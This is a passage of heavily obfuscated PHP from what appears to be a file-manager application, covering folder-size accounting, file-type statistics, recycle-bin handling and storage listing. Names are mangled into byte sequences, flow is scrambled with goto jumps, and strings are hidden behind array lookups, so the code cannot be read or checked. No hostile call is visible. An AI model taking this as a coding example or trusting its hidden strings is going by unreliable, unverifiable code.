a·Š¨åŸ“; AÉÙÕ£‡´: $cà¬™òÒà³ = $this->parentLevelArray($E¬º’¨ßãé[$EŠÓ°íãí‡[485]]); if ($cà¬™òÒà³) { $b‘³äŞÔò = array($EŠÓ°íãí‡[394] => array($EŠÓ°íãí‡[409], $cà¬™òÒà³)); if ($e©ùîÇ ¸Š < 0) { $b‘³äŞÔò[$EŠÓ°íãí‡[77]] = array($EŠÓ°íãí‡[950], abs($e©ùîÇ ¸Š)); } $this->where($b‘³äŞÔò)->setAdd($EŠÓ°íãí‡[77], $e©ùîÇ ¸Š); } $this->targetSpaceUpdate($E¬º’¨ßãé[$EŠÓ°íãí‡[396]], $E¬º’¨ßãé[$EŠÓ°íãí‡[482]]); goto D¤ÒŠ¿³; D¤ÒŠ¿³: CacheLock::unlock($c˜í…âŒª); goto b‰×„§ùÙĞ; d­ö«–·»³: CacheLock::lock($c˜í…âŒª, 20); $this->sourceCacheClear($cŠÆ†Â‘™¨); $E¬º’¨ßãé = $this->sourceInfo($cŠÆ†Â‘™¨); goto E•¢ôéòé; fÀ”ÌÌ¤›É: $EŠÓ°íãí‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($this->statusIgnoreResetSpace) { return; } $c˜í…âŒª = $EŠÓ°íãí‡[2417] . $cŠÆ†Â‘™¨; goto d­ö«–·»³; a·Š¨åŸ“: $e©ùîÇ ¸Š = $E¦ƒÒÉæÒ - intval($E¬º’¨ßãé[$EŠÓ°íãí‡[77]]); if ($e©ùîÇ ¸Š == 0) { return CacheLock::unlock($c˜í…âŒª); } $this->where(array($EŠÓ°íãí‡[408] => $cŠÆ†Â‘™¨))->setField($EŠÓ°íãí‡[77], $E¦ƒÒÉæÒ); goto AÉÙÕ£‡´; b‰×„§ùÙĞ: } public function folderSizeResetChildren($a—‘øÏóê¶) { goto e¥´Ì’õÅ; DÈÙå‰¾Ë: foreach ($AÆÎì‚ as $d¼Ö„™ö¾ï) { $CÙ¢ÊÎ‘ï­ = $d¼Ö„™ö¾ï[$cÍİ¦ˆÓË[487]] . $cÍİ¦ˆÓË[33]; if (!isset($c‡„½ÖÖåÉ[$CÙ¢ÊÎ‘ï­])) { continue; } if ($d¼Ö„™ö¾ï[$cÍİ¦ˆÓË[422]] == $c‡„½ÖÖåÉ[$CÙ¢ÊÎ‘ï­][$cÍİ¦ˆÓË[422]]) { $c‡„½ÖÖåÉ[$CÙ¢ÊÎ‘ï­][$cÍİ¦ˆÓË[77]] += $d¼Ö„™ö¾ï[$cÍİ¦ˆÓË[77]]; } } foreach ($c‡„½ÖÖåÉ as $d¼Ö„™ö¾ï) { $aØÉ°Á ·® = $this->parentLevelArray($d¼Ö„™ö¾ï[$cÍİ¦ˆÓË[485]]); foreach ($aØÉ°Á ·® as $CÙ¢ÊÎ‘ï­) { $CÙ¢ÊÎ‘ï­ = $CÙ¢ÊÎ‘ï­ . $cÍİ¦ˆÓË[33]; if (!isset($c‡„½ÖÖåÉ[$CÙ¢ÊÎ‘ï­])) { continue; } if ($d¼Ö„™ö¾ï[$cÍİ¦ˆÓË[422]] == $c‡„½ÖÖåÉ[$CÙ¢ÊÎ‘ï­][$cÍİ¦ˆÓË[422]]) { $c‡„½ÖÖåÉ[$CÙ¢ÊÎ‘ï­][$cÍİ¦ˆÓË[77]] += $d¼Ö„™ö¾ï[$cÍİ¦ˆÓË[77]]; } } } $B‰ğÕ¬Á‹ = array(); goto d ¬÷¹×â¬; e¥´Ì’õÅ: $cÍİ¦ˆÓË =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->sourceCacheClear($a—‘øÏóê¶); $E¨»”‘…ß = $this->sourceInfo($a—‘øÏóê¶); goto C¼ø‰‘Šø‚; Aâ•àÁ“òÕ: $bø‡Ğ¹…î[$cÍİ¦ˆÓË[395]] = 0; $AÆÎì‚ = $this->field($aˆîÅ•‡æñ)->where($bø‡Ğ¹…î)->select(); if (!$AÆÎì‚) { return; } goto C÷¦­ÇŸ‡ƒ; C¼ø‰‘Šø‚: $bø‡Ğ¹…î = array($cÍİ¦ˆÓË[544] => 1, $cÍİ¦ˆÓË[551] => array($cÍİ¦ˆÓË[509], $E¨»”‘…ß[$cÍİ¦ˆÓË[485]] . $a—‘øÏóê¶ . $cÍİ¦ˆÓË[510])); $aˆîÅ•‡æñ = $cÍİ¦ˆÓË[2418]; $c‡„½ÖÖåÉ = $this->field($aˆîÅ•‡æñ)->where($bø‡Ğ¹…î)->select(); goto Aâ•àÁ“òÕ; d ¬÷¹×â¬: foreach ($c‡„½ÖÖåÉ as $d¼Ö„™ö¾ï) { if ($d¼Ö„™ö¾ï[$cÍİ¦ˆÓË[77]] == $d¼Ö„™ö¾ï[$cÍİ¦ˆÓË[2419]]) { continue; } $B‰ğÕ¬Á‹[] = array($cÍİ¦ˆÓË[394], $d¼Ö„™ö¾ï[$cÍİ¦ˆÓË[394]], $cÍİ¦ˆÓË[77], $d¼Ö„™ö¾ï[$cÍİ¦ˆÓË[77]]); } $this->saveAll($B‰ğÕ¬Á‹); goto aÃ©ÅÁ¨“…; C÷¦­ÇŸ‡ƒ: $c‡„½ÖÖåÉ[] = $E¨»”‘…ß; $c‡„½ÖÖåÉ = array_to_keyvalue($c‡„½ÖÖåÉ, $cÍİ¦ˆÓË[394]); foreach ($c‡„½ÖÖåÉ as $Dõµİ¹ù– => $d¼Ö„™ö¾ï) { $c‡„½ÖÖåÉ[$Dõµİ¹ù–][$cÍİ¦ˆÓË[2419]] = $c‡„½ÖÖåÉ[$Dõµİ¹ù–][$cÍİ¦ˆÓË[77]]; $c‡„½ÖÖåÉ[$Dõµİ¹ù–][$cÍİ¦ˆÓË[77]] = 0; } goto DÈÙå‰¾Ë; aÃ©ÅÁ¨“…: } public function userSpaceReset($DåÜíù¿è = false) { $fÄÑ‡Ü¤¶¸ =& $_SERVER[åÌÛ»ô¢‚ö™]; $bˆ‹çÏÇ­ = $this->where(array($fÄÑ‡Ü¤¶¸[396] => self::TYPE_USER, $fÄÑ‡Ü¤¶¸[482] => $DåÜíù¿è, $fÄÑ‡Ü¤¶¸[395] => 0))->sum($fÄÑ‡Ü¤¶¸[77]); Model($fÄÑ‡Ü¤¶¸[500])->userEdit($DåÜíù¿è, array($fÄÑ‡Ü¤¶¸[2124] => $bˆ‹çÏÇ­)); } public function targetSpaceUpdate($DæÒ»Ú¸¶§, $a‡‹Å¬˜‡§) { $DëÁ­˜–œí =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$a‡‹Å¬˜‡§) { return; } if (!in_array($DæÒ»Ú¸¶§, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $d…óã…Œâ = $this->targetSpaceSize($DæÒ»Ú¸¶§, $a‡‹Å¬˜‡§); if ($DæÒ»Ú¸¶§ == self::TYPE_USER) { Model($DëÁ­˜–œí[500])->userEdit($a‡‹Å¬˜‡§, array($DëÁ­˜–œí[2124] => $d…óã…Œâ)); } else { if ($DæÒ»Ú¸¶§ == self::TYPE_GROUP) { Model($DëÁ­˜–œí[484])->groupEdit($a‡‹Å¬˜‡§, array($DëÁ­˜–œí[2124] => $d…óã…Œâ)); } } } public function targetSpaceSize($f†ÇÅÌ˜ß, $döß…ĞÀ™Â) { goto FŠÚ†Õ½»¸; FŠÚ†Õ½»¸: $Cï†µµ´Ñæ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fÑ’šœõ‘ = $this->sourceRoot($f†ÇÅÌ˜ß, $döß…ĞÀ™Â, !0); if (!$fÑ’šœõ‘) { return 0; } goto B‹ÈÊ£óÃƒ; B‹ÈÊ£óÃƒ: $bÎÍˆ„Üö» = floatval($fÑ’šœõ‘[$Cï†µµ´Ñæ[77]]); $bÛŒ® ¥… = array($Cï†µµ´Ñæ[551] => array($Cï†µµ´Ñæ[509], $Cï†µµ´Ñæ[496] . $fÑ’šœõ‘[$Cï†µµ´Ñæ[394]] . $Cï†µµ´Ñæ[510])); $bÚ¦ë„ÅÚì = Model($Cï†µµ´Ñæ[420])->field($Cï†µµ´Ñæ[408])->where($bÛŒ® ¥…)->select(); goto FŒ‹¦”…¹; FŒ‹¦”…¹: $bÚ¦ë„ÅÚì = array_to_keyvalue($bÚ¦ë„ÅÚì, $Cï†µµ´Ñæ[33], $Cï†µµ´Ñæ[394]); $bÚ¦ë„ÅÚì = array_unique(array_filter($bÚ¦ë„ÅÚì)); if ($bÚ¦ë„ÅÚì) { $bÛŒ® ¥… = array($Cï†µµ´Ñæ[408] => array($Cï†µµ´Ñæ[409], $bÚ¦ë„ÅÚì)); $bÎÍˆ„Üö» += floatval($this->where($bÛŒ® ¥…)->sum($Cï†µµ´Ñæ[77])); } goto d±ì ®ˆ„¹; d±ì ®ˆ„¹: return $bÎÍˆ„Üö»; goto F—ÔÊÒ‘Šç; F—ÔÊÒ‘Šç: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($D‚òñ²ªË¿) { return $this->fileTypeProfile($D‚òñ²ªË¿, SourceModel::TYPE_USER); } public function groupFileTypeProfile($eì©½»‘Ï) { return $this->fileTypeProfile($eì©½»‘Ï, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Aã±Ïøº‹½, $C¼å“ó´âÓ) { goto FäË…Ü¼ˆø; b‹÷“ßÇÇÌ: $f¥†´¢ê‡ = array(); $f¥†´¢ê‡[$CÁºŒĞÕ»´[2421]] = array($CÁºŒĞÕ»´[2422] => LNG($CÁºŒĞÕ»´[2421]), $CÁºŒĞÕ»´[2423] => $this->where($b–æ«’Ì Å)->count(), $CÁºŒĞÕ»´[546] => $this->where($b–æ«’Ì Å)->sum($CÁºŒĞÕ»´[77])); $B¤ÇÓ¦Ç­ = KodIO::fileTypeList(); goto Aã•Óù¼¤; aõÇàÓºàŠ: if ($C³ù˜•…ğÍ) { return $C³ù˜•…ğÍ; } $b–æ«’Ì Å = array($CÁºŒĞÕ»´[544] => 0); if ($Aã±Ïøº‹½ != !1) { $b–æ«’Ì Å[$CÁºŒĞÕ»´[482]] = $Aã±Ïøº‹½; $b–æ«’Ì Å[$CÁºŒĞÕ»´[396]] = $C¼å“ó´âÓ; } goto b‹÷“ßÇÇÌ; FäË…Ü¼ˆø: $CÁºŒĞÕ»´ =& $_SERVER[åÌÛ»ô¢‚ö™]; $E¦ßŞñ¸ˆ… = $CÁºŒĞÕ»´[2420] . $Aã±Ïøº‹½ . $CÁºŒĞÕ»´[70] . $C¼å“ó´âÓ; $C³ù˜•…ğÍ = Cache::get($E¦ßŞñ¸ˆ…); goto aõÇàÓºàŠ; Aã•Óù¼¤: foreach ($B¤ÇÓ¦Ç­ as $Eƒì‘„À‡ => $c¸‡ÚÔ¾¼÷) { $b–æ«’Ì Å[$CÁºŒĞÕ»´[397]] = $this->fileTypeWhere($Eƒì‘„À‡); $f¥†´¢ê‡[$Eƒì‘„À‡] = array($CÁºŒĞÕ»´[2422] => $c¸‡ÚÔ¾¼÷[$CÁºŒĞÕ»´[28]], $CÁºŒĞÕ»´[2423] => $this->where($b–æ«’Ì Å)->count(), $CÁºŒĞÕ»´[546] => $this->where($b–æ«’Ì Å)->sum($CÁºŒĞÕ»´[77])); } Cache::set($E¦ßŞñ¸ˆ…, $f¥†´¢ê‡, 1200); return $f¥†´¢ê‡; goto côñ ğÈº½; côñ ğÈº½: } public function fileNameExist($BÏÉ«éì†Ø, $aâÉß¼‚‘ó) { $fí‰‚œİØé =& $_SERVER[åÌÛ»ô¢‚ö™]; $aç¤™¬ = $this->childList($BÏÉ«éì†Ø); foreach ($aç¤™¬ as $e•ÆĞ˜öç¬) { if ($e•ÆĞ˜öç¬[$fí‰‚œİØé[28]] == $aâÉß¼‚‘ó) { return $e•ÆĞ˜öç¬[$fí‰‚œİØé[394]]; } if (strtolower($e•ÆĞ˜öç¬[$fí‰‚œİØé[28]]) == strtolower($aâÉß¼‚‘ó)) { return $e•ÆĞ˜öç¬[$fí‰‚œİØé[394]]; } } return !1; } public function childList($d®öÂ«½è‚) { goto bÀ‡‚«„Û¬; bÀ‡‚«„Û¬: $DßâÈĞ³¼– =& $_SERVER[åÌÛ»ô¢‚ö™]; $bÁà×éÑ¯é = $DßâÈĞ³¼–[2402] . $d®öÂ«½è‚; if (isset(self::$cacheChildList[$bÁà×éÑ¯é])) { return self::$cacheChildList[$bÁà×éÑ¯é]; } goto bĞô¦ôˆé³; E‚ùÏµË¿‡: self::$cacheChildList[$bÁà×éÑ¯é] = $BèÙìù”éö; foreach ($BèÙìù”éö as $f«–±‡ñòë) { $bÁà×éÑ¯é = $DßâÈĞ³¼–[435] . $f«–±‡ñòë[$DßâÈĞ³¼–[394]]; self::$cacheSourceInfo[$bÁà×éÑ¯é] = $f«–±‡ñòë; } return $BèÙìù”éö; goto b‡¦ë×Œ¥; bĞô¦ôˆé³: $E‰‘Íª†› = array($DßâÈĞ³¼–[487] => intval($d®öÂ«½è‚), $DßâÈĞ³¼–[422] => 0); $BèÙìù”éö = $this->where($E‰‘Íª†›)->select(); $BèÙìù”éö = $BèÙìù”éö ? $BèÙìù”éö : array(); goto E‚ùÏµË¿‡; b‡¦ë×Œ¥: } public function fileNameAuto($fÜ²‹ñ …, $Dİ²š£„×š, $A²­áŠÎ¬ = REPEAT_RENAME, $e÷î¹Ø‰Æ = false) { $a½Ê¶Ó¬¢ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÌ…Á“ÀÊø = $this->childList($fÜ²‹ñ …); $E—Šº©¡Š = array_to_keyvalue($FÌ…Á“ÀÊø, $a½Ê¶Ó¬¢[33], $a½Ê¶Ó¬¢[28]); return $this->fileNameAutoGet($E—Šº©¡Š, $Dİ²š£„×š, $A²­áŠÎ¬, $e÷î¹Ø‰Æ); } public function fileNameAutoGet($fË…¾›Å, $c¬â˜˜¸…‚, $Dù´ª‡˜, $cÃ¾í¬ÈÃ) { $b¸˜´•Š¹Ç =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($Dù´ª‡˜ == REPEAT_REPLACE || !$fË…¾›Å || !in_array_not_case($c¬â˜˜¸…‚, $fË…¾›Å) || $cÃ¾í¬ÈÃ && $Dù´ª‡˜ != REPEAT_RENAME_FOLDER) { return $c¬â˜˜¸…‚; } if ($Dù´ª‡˜ == REPEAT_SKIP) { return !1; } $D‹–ëÁŸ°ó = $b¸˜´•Š¹Ç[91] . get_path_ext($c¬â˜˜¸…‚); $D‹–ëÁŸ°ó = $D‹–ëÁŸ°ó == $b¸˜´•Š¹Ç[91] || $cÃ¾í¬ÈÃ ? $b¸˜´•Š¹Ç[33] : $D‹–ëÁŸ°ó; for ($a‚«µñ·®Ÿ = 1; $a‚«µñ·®Ÿ <= count($fË…¾›Å) + 1; $a‚«µñ·®Ÿ++) { $BäË‰œ¡ÈÄ = substr($c¬â˜˜¸…‚, 0, strlen($c¬â˜˜¸…‚) - strlen($D‹–ëÁŸ°ó)); $B¬º„ àÖ‰ = $BäË‰œ¡ÈÄ . "\x28{$a‚«µñ·®Ÿ}\x29{$D‹–ëÁŸ°ó}"; if (!in_array_not_case($B¬º„ àÖ‰, $fË…¾›Å)) { return $B¬º„ àÖ‰; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\162\x63\x65\x5f\162\x65\143\171\x63\154\145"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\x54\151\x6d\145", "\x74\x69\155\x65", "\151\x6e\x73\x65\162\164", "\146\x75\156\x63\164\151\157\156")); public function listData($CÌĞÖÀø„ = false) { $A•’“°âÜß =& $_SERVER[åÌÛ»ô¢‚ö™]; $CÌĞÖÀø„ = $CÌĞÖÀø„ ? $CÌĞÖÀø„ : USER_ID; $F…‘öåùÁï = $this->where(array($A•’“°âÜß[1457] => $CÌĞÖÀø„))->select(); return array_to_keyvalue($F…‘öåùÁï, $A•’“°âÜß[33], $A•’“°âÜß[394]); } public function moveToRecycle($d¯°ÔÖ®¶³) { goto d÷ô·—ƒ¥Ã; Cª½áÃîå: $this->recycleMove($d¯°ÔÖ®¶³, 1); if ($F…§ùø” [$Cí¦Àáìç[395]] == $Cí¦Àáìç[83]) { $fµ®õÅï‚ = array($Cí¦Àáìç[551] => array($Cí¦Àáìç[509], $F…§ùø” [$Cí¦Àáìç[485]] . $d¯°ÔÖ®¶³ . $Cí¦Àáìç[510])); $d¬ÕéÏÖÕ¹->where($fµ®õÅï‚)->setField($Cí¦Àáìç[422], 1); } goto cÊ‰ß«óÏÔ; E¥áªáÜ‡Ù: if (!$F…§ùø”  || $F…§ùø” [$Cí¦Àáìç[422]] == $Cí¦Àáìç[83]) { return; } $d—ø˜íÚÇ‡ = array($Cí¦Àáìç[408] => $d¯°ÔÖ®¶³, $Cí¦Àáìç[1457] => USER_ID, $Cí¦Àáìç[547] => $F…§ùø” [$Cí¦Àáìç[396]], $Cí¦Àáìç[548] => $F…§ùø” [$Cí¦Àáìç[482]], $Cí¦Àáìç[551] => $F…§ùø” [$Cí¦Àáìç[485]]); $this->add($d—ø˜íÚÇ‡); goto Cª½áÃîå; d÷ô·—ƒ¥Ã: $Cí¦Àáìç =& $_SERVER[åÌÛ»ô¢‚ö™]; $d¬ÕéÏÖÕ¹ = Model($Cí¦Àáìç[1143]); $F…§ùø”  = $d¬ÕéÏÖÕ¹->sourceInfo($d¯°ÔÖ®¶³); goto E¥áªáÜ‡Ù; cÊ‰ß«óÏÔ: } public function clear() { $this->remove(!1); } public function remove($E÷ËÇóŸÇÃ = false) { goto c‹ÑŞŸ½ŞÑ; a™±‡í²Ğƒ: $E÷ËÇóŸÇÃ = $E÷ËÇóŸÇÃ === !1 ? !1 : $E÷ËÇóŸÇÃ; $EÈˆÀ‚ÎŞÌ = array(); foreach ($Cê˜¥µ°¬ as $E¥²Ó¹‹®—) { if ($E÷ËÇóŸÇÃ != !1 && !in_array($E¥²Ó¹‹®—, $E÷ËÇóŸÇÃ)) { continue; } $a‡‘ŞŒÛ‹Ù = $D¼ƒô˜©²ù->sourceInfo($E¥²Ó¹‹®—); $D¼ƒô˜©²ù->remove($E¥²Ó¹‹®—, !1); $DÍ–ŠŒè‰ = $a‡‘ŞŒÛ‹Ù[$C–ìì¼ô†ˆ[396]] . $C–ìì¼ô†ˆ[70] . $a‡‘ŞŒÛ‹Ù[$C–ìì¼ô†ˆ[482]]; $EÈˆÀ‚ÎŞÌ[$DÍ–ŠŒè‰] = array($C–ìì¼ô†ˆ[547] => $a‡‘ŞŒÛ‹Ù[$C–ìì¼ô†ˆ[396]], $C–ìì¼ô†ˆ[482] => $a‡‘ŞŒÛ‹Ù[$C–ìì¼ô†ˆ[482]]); $this->where(array($C–ìì¼ô†ˆ[394] => $E¥²Ó¹‹®—))->delete(); } goto AŠ£ğ„¤…ª; c‹ÑŞŸ½ŞÑ: $C–ìì¼ô†ˆ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D¼ƒô˜©²ù = Model($C–ìì¼ô†ˆ[1143]); $Cê˜¥µ°¬ = $this->listData(); goto a™±‡í²Ğƒ; AŠ£ğ„¤…ª: foreach ($EÈˆÀ‚ÎŞÌ as $d‰óêÁáà) { $D¼ƒô˜©²ù->targetSpaceUpdate($d‰óêÁáà[$C–ìì¼ô†ˆ[396]], $d‰óêÁáà[$C–ìì¼ô†ˆ[482]]); } goto DŞá›¶õ††; DŞá›¶õ††: } public function restore($bËÇÊ‘ŠÇ‚ = false) { goto aÈÑ‘‚†™†; aÈÑ‘‚†™†: $EĞ‰¾È ¡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dòñÔó’Ô‹ = Model($EĞ‰¾È ¡[1143]); $fØŒÕÔéìé = $this->listData(); goto Cè—Ëáöò˜; Cè—Ëáöò˜: $bËÇÊ‘ŠÇ‚ = $bËÇÊ‘ŠÇ‚ == !1 ? !1 : $bËÇÊ‘ŠÇ‚; if (!$fØŒÕÔéìé) { return !0; } $DôÍáåÊğè = array(); goto CÚè”õ‘Ç›; CÚè”õ‘Ç›: foreach ($fØŒÕÔéìé as $f–ĞÉÉµ‰) { goto a‡Ïõó±•ì; d‚Ãì²ƒ×: $DôÍáåÊğè[] = $B ŒµšÒƒÉ[$EĞ‰¾È ¡[487]]; if ($B ŒµšÒƒÉ[$EĞ‰¾È ¡[395]] == $EĞ‰¾È ¡[83]) { $DôÍáåÊğè[] = $f–ĞÉÉµ‰; } $dòñÔó’Ô‹->lockMoveEnd($f–ĞÉÉµ‰); goto B¯«™œÕÈ·; EáÓíŠ¥ğ†: if ($B ŒµšÒƒÉ[$EĞ‰¾È ¡[395]] == $EĞ‰¾È ¡[83]) { $Eô¤ƒ‹´Ñ = array($EĞ‰¾È ¡[551] => array($EĞ‰¾È ¡[509], $B ŒµšÒƒÉ[$EĞ‰¾È ¡[485]] . $f–ĞÉÉµ‰ . $EĞ‰¾È ¡[510])); $dòñÔó’Ô‹->where($Eô¤ƒ‹´Ñ)->setField($EĞ‰¾È ¡[422], 0); $this->restoreFolderChildren($f–ĞÉÉµ‰, $fØŒÕÔéìé); } $this->where(array($EĞ‰¾È ¡[394] => $f–ĞÉÉµ‰))->delete(); $dòñÔó’Ô‹->folderSizeReset($B ŒµšÒƒÉ[$EĞ‰¾È ¡[487]]); goto d‚Ãì²ƒ×; a¯‡¥¾«Ğ‹: if ($C ®é¥Õ¥¥[$EĞ‰¾È ¡[422]] == $EĞ‰¾È ¡[83]) { continue; } $dòñÔó’Ô‹->lockMoveStart($f–ĞÉÉµ‰); $this->recycleMove($f–ĞÉÉµ‰, 0); goto EáÓíŠ¥ğ†; a‡Ïõó±•ì: if ($bËÇÊ‘ŠÇ‚ != !1 && !in_array($f–ĞÉÉµ‰, $bËÇÊ‘ŠÇ‚)) { continue; } $B ŒµšÒƒÉ = $dòñÔó’Ô‹->sourceInfo($f–ĞÉÉµ‰); $C ®é¥Õ¥¥ = $dòñÔó’Ô‹->sourceInfo($B ŒµšÒƒÉ[$EĞ‰¾È ¡[487]]); goto a¯‡¥¾«Ğ‹; B¯«™œÕÈ·: } $dòñÔó’Ô‹->updateModifyTime($DôÍáåÊğè); goto BÜÁ×¼ÍŞ›; BÜÁ×¼ÍŞ›: } private function restoreFolderChildren($dÁ›åÚô¯°, $Eîó£åñµÖ) { goto f¢´ùÂ É«; f²É‹ÖòœŠ: foreach ($Eîó£åñµÖ as $a¾ÓÖí±Š) { if ($a¾ÓÖí±Š == $dÁ›åÚô¯°) { continue; } if (!$B‡’•êø×Œ->isParentOf($dÁ›åÚô¯°, $a¾ÓÖí±Š)) { continue; } $C·±¦®ˆ  = $B‡’•êø×Œ->sourceInfo($a¾ÓÖí±Š); if ($C·±¦®ˆ [$dÄ¹×‘·È[395]] == $dÄ¹×‘·È[83]) { $FªŒøï²áˆ[] = array($dÄ¹×‘·È[551] => array($dÄ¹×‘·È[509], $C·±¦®ˆ [$dÄ¹×‘·È[485]] . $a¾ÓÖí±Š . $dÄ¹×‘·È[510])); } else { $FªŒøï²áˆ[$dÄ¹×‘·È[394]][1][] = $a¾ÓÖí±Š; } } if (!$FªŒøï²áˆ[$dÄ¹×‘·È[394]][1]) { unset($FªŒøï²áˆ[$dÄ¹×‘·È[394]]); } if (!$FªŒøï²áˆ) { return; } goto b¾¯’¥è°õ; b¾¯’¥è°õ: $FªŒøï²áˆ[$dÄ¹×‘·È[394]][1] = array_unique($FªŒøï²áˆ[$dÄ¹×‘·È[394]][1]); $FªŒøï²áˆ[$dÄ¹×‘·È[935]] = $dÄ¹×‘·È[2223]; $B‡’•êø×Œ->where($FªŒøï²áˆ)->setField($dÄ¹×‘·È[422], 1); goto BêòªÖ ËÜ; f¢´ùÂ É«: $dÄ¹×‘·È =& $_SERVER[åÌÛ»ô¢‚ö™]; $B‡’•êø×Œ = Model($dÄ¹×‘·È[1143]); $FªŒøï²áˆ = array($dÄ¹×‘·È[394] => array($dÄ¹×‘·È[7], array())); goto f²É‹ÖòœŠ; BêòªÖ ËÜ: } private function recycleMove($B¶¿™™ÕàÍ, $DĞÂŒÖÛ‚å = 1) { $E¤À‹öÁ´¤ =& $_SERVER[åÌÛ»ô¢‚ö™]; $DÊÎà¡¹ = Model($E¤À‹öÁ´¤[1143]); $A°ÜöÑÏ×Œ = Model($E¤À‹öÁ´¤[2424]); $B¥öî»‚¶ = array($E¤À‹öÁ´¤[394] => $B¶¿™™ÕàÍ); if ($DĞÂŒÖÛ‚å) { $DÊÎà¡¹->where($B¥öî»‚¶)->setField($E¤À‹öÁ´¤[422], 1); $A°ÜöÑÏ×Œ->eventRecycle($B¶¿™™ÕàÍ, $E¤À‹öÁ´¤[2425]); } else { $A³ğ¾££µ¦ = $DÊÎà¡¹->where($B¥öî»‚¶)->find(); $F¨É¨¡Š× = $A³ğ¾££µ¦[$E¤À‹öÁ´¤[395]] == $E¤À‹öÁ´¤[83]; $fßÆ¥÷Ãñ… = $DÊÎà¡¹->fileNameAuto($A³ğ¾££µ¦[$E¤À‹öÁ´¤[487]], $A³ğ¾££µ¦[$E¤À‹öÁ´¤[28]], REPEAT_RENAME_FOLDER, $F¨É¨¡Š×); if ($fßÆ¥÷Ãñ… != $A³ğ¾££µ¦[$E¤À‹öÁ´¤[28]]) { $DÊÎà¡¹->rename($B¶¿™™ÕàÍ, $fßÆ¥÷Ãñ…); } $DÊÎà¡¹->where($B¥öî»‚¶)->setField($E¤À‹öÁ´¤[422], 0); $A°ÜöÑÏ×Œ->eventRecycle($B¶¿™™ÕàÍ, $E¤À‹öÁ´¤[2426]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\163\x74\x6f\x72\x61\x67\x65\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\163\151\172\145\115\x61\x78", "\x73\171\x73\164\145\x6d", "\144\145\x66\x61\x75\154\164", "\144\162\x69\166\x65\x72", "\x63\157\x6e\x66\x69\147"); public function listData($fÖ¨ŸïÇèº = false, $Bö÷ÒĞá¼Æ = "\155\157\144\x69\x66\171\x54\x69\155\x65", $Aœí†è¾Åƒ = false) { goto Fé¤±®›¦ê; EŠåéÉÃëÊ: foreach ($a«‰ôƒˆã† as $aø±Ğõ´°Î => $Dî¦‰ïİÁ†) { unset($a«‰ôƒˆã†[$aø±Ğõ´°Î][$f—ËæºáÕ‹[6]]); $a«‰ôƒˆã†[$aø±Ğõ´°Î][$f—ËæºáÕ‹[2124]] = 0; } $f‰½´Šİ¯ì = array_to_keyvalue($a«‰ôƒˆã†, $f—ËæºáÕ‹[33], $f—ËæºáÕ‹[392]); $this->_listAppendSize($a«‰ôƒˆã†, $f‰½´Šİ¯ì); goto aâï®Òîá; Fé¤±®›¦ê: $f—ËæºáÕ‹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $a«‰ôƒˆã† = parent::listData($fÖ¨ŸïÇèº, $Bö÷ÒĞá¼Æ, $Aœí†è¾Åƒ); if ($fÖ¨ŸïÇèº) { return $a«‰ôƒˆã†; } goto EŠåéÉÃëÊ; aâï®Òîá: return $a«‰ôƒˆã†; goto d•ñŠ®×˜ß; d•ñŠ®×˜ß: } public function _listAppendSize(&$Cğ¶‚Œ½Ÿ½, $fÊÉõñ¶Ø) { $F¦§ªˆèÖì =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$fÊÉõñ¶Ø) { return; } $fŸğÉé„ç† = $F¦§ªˆèÖì[2427] . implode($F¦§ªˆèÖì[47], $fÊÉõñ¶Ø) . $F¦§ªˆèÖì[2428]; $aĞã…¿³• = Model($F¦§ªˆèÖì[745])->query($fŸğÉé„ç†); $aĞã…¿³• = array_to_keyvalue($aĞã…¿³•, $F¦§ªˆèÖì[392], $F¦§ªˆèÖì[77]); foreach ($Cğ¶‚Œ½Ÿ½ as $bİ‹ÒĞÓ“’ => $Eë…„ğìà) { $Cğ¶‚Œ½Ÿ½[$bİ‹ÒĞÓ“’][$F¦§ªˆèÖì[2124]] = isset($aĞã…¿³•[$Eë…„ğìà[$F¦§ªˆèÖì[392]]]) ? $aĞã…¿³•[$Eë…„ğìà[$F¦§ªˆèÖì[392]]] : 0; } } public function getConfig($aÂ‡ª†ÒåÀ) { $d±‘ä‚è®„ = parent::listData($aÂ‡ª†ÒåÀ); return json_decode($d±‘ä‚è®„[$_SERVER[åÌÛ»ô¢‚ö™][6]], !0); } public function update($BÌî½ëáç„, $Cä†êÓ«) { goto f»ãªøÎ„Ñ; cÚš•¹øø: $EÌÉ…øÂ = parent::update($BÌî½ëáç„, $Cä†êÓ«); if ($EÌÉ…øÂ && $Cä†êÓ«[$FÙ¹˜È‡Èà[34]]) { foreach ($Fƒ¹¶ƒÄšÒ as $a‰…İíèë) { if ($a‰…İíèë[$FÙ¹˜È‡Èà[34]] && $a‰…İíèë[$FÙ¹˜È‡Èà[392]] != $BÌî½ëáç„) { parent::update($a‰…İíèë[$FÙ¹˜È‡Èà[392]], array($FÙ¹˜È‡Èà[34] => 0)); } } } return $EÌÉ…øÂ; goto E±½ŠÎ‹ì; f»ãªøÎ„Ñ: $FÙ¹˜È‡Èà =& $_SERVER[åÌÛ»ô¢‚ö™]; $Cè¬óÎóËÜ = $Cä†êÓ«[$FÙ¹˜È‡Èà[28]]; $Fƒ¹¶ƒÄšÒ = array_to_keyvalue(parent::listData(), $FÙ¹˜È‡Èà[28]); goto A‹›äâµˆ‹; A‹›äâµˆ‹: if (isset($Fƒ¹¶ƒÄšÒ[$Cè¬óÎóËÜ]) && $Fƒ¹¶ƒÄšÒ[$Cè¬óÎóËÜ][$FÙ¹˜È‡Èà[392]] != $BÌî½ëáç„) { return !1; } if (isset($Cä†êÓ«[$FÙ¹˜È‡Èà[2429]]) && $Cä†êÓ«[$FÙ¹˜È‡Èà[2429]] == $FÙ¹˜È‡Èà[83]) { 